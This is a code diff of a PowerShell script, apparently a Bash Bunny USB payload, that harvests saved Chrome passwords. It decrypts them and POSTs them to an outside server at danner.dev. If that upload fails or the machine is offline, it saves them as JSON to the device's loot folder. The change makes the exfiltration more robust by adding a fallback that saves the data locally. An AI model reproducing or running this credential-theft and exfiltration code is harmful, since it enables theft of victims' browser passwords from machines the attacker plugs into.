@@ -18,6 +18,15 @@ function decryptPassword ($encryptedPassword) {
 	return $password
 }
 
+function saveLocally($jsonData) {
+	$lootPath =  ((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\loot\')
+	$lootName = $lootPath + ($env:computername + "_" + (get-date).ToUniversalTime().ToString("yyyyMMddTHHmmss")) + ".json"
+	$jsonData | ConvertTo-Json | Out-File $lootName
+	if([System.IO.File]::Exists($lootName)) {
+		Write-Host "File written to loot folder.. offline."
+	}
+}
+
 foreach ($path in $paths) { # iterate through each logindata (if there are more than one)
 	$backup=$path.FullName+'_bak' # backup file as chrome holds a lock on the original file
 	Copy-Item $path.FullName -Destination $backup -Force -Confirm:$false # copy the file
@@ -35,12 +44,11 @@ $secret = Get-Content -Path ($scriptPath + "\secret.txt")
 $encryptedData = ,$secret + $encryptedData
 
 if(Test-Connection -ComputerName google.com -Quiet) {
-	Invoke-WebRequest -Uri https://danner.dev:4000/bunny/chrome/submitChromeCreds -Method POST -Body ($encryptedData|ConvertTo-Json) -ContentType "application/json"
-} else {
-	$lootPath =  ((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\loot\')
-	$lootName = $lootPath + ($env:computername + "_" + (get-date).ToUniversalTime().ToString("yyyyMMddTHHmmss")) + ".json"
-	$encryptedData | ConvertTo-Json | Out-File $lootName
-	if([System.IO.File]::Exists($lootName)) {
-		Write-Host "File written to loot folder.. offline."
+	try {
+		Invoke-WebRequest -Uri https://danner.dev:4000/bunny/chrome/submitChromeCreds -Method POST -Body ($encryptedData|ConvertTo-Json) -ContentType "application/json"
+	} catch {
+		saveLocally($encryptedData)
 	}
+} else {
+	saveLocally($encryptedData)
 }
